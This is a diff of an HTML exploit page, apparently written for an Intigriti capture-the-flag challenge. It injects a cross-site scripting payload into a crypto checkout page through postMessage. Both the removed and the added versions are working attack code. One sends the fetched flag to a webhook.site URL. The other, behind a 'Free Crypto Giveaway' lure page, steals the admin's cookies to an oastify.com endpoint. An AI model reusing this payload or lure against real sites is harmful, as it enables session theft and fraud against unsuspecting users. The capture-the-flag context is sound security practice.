@@ -1,26 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <title>Free Crypto Giveaway - Limited Time!</title>
+    <style>
+        body { background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 20%; }
+    </style>
+</head>
 <body>
-<script>
-// Open checkout page in hidden iframe
-const iframe = document.createElement('iframe');
-iframe.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
+    <h1>Initializing MarketWatch Exploit...</h1>
+    <p>Do not close this tab.</p>
 
-iframe.onload = () => {
-  setTimeout(() => {
-    // Inject XSS payload via postMessage
-    iframe.contentWindow.postMessage({
-      type: 'submitTransaction',
-      transaction: {
-        toAddress: '<img/src="x"/onerror="fetch(`/api/me`).then(r=>r.json()).then(d=>fetch(`https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?f=${encodeURIComponent(d.flag)}`))">',
-        currency: '1337COIN',
-        amount: 0.00000001
-      }
-    }, '*');
-  }, 1000);
-};
-</script>
+    <script>
+        // Use 1337COIN since that's what the Admin holds
+        const VICTIM_URL = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
+        
+        // This payload breaks out of the title="" attribute and injects an image tag
+        // that sends the Admin's cookies/local storage to your OAST endpoint.
+        const XSS_PAYLOAD = '"><img src=x onerror="window.location=\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?data=\'+btoa(document.cookie)">';
+        
+        // Step 1: Open the target in a new tab
+        const victimWindow = window.open(VICTIM_URL, '_blank');
+        
+        // Step 2: Wait 4 seconds for the Admin's Wallet API to load
+        setTimeout(() => {
+            victimWindow.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    currency: '1337COIN',
+                    amount: 1, 
+                    toAddress: XSS_PAYLOAD // Injecting XSS into the Address field!
+                }
+            }, '*');
+            
+            console.log("XSS Payload Injected into Transaction DB!");
+        }, 4000); 
+    </script>
 </body>
 </html>
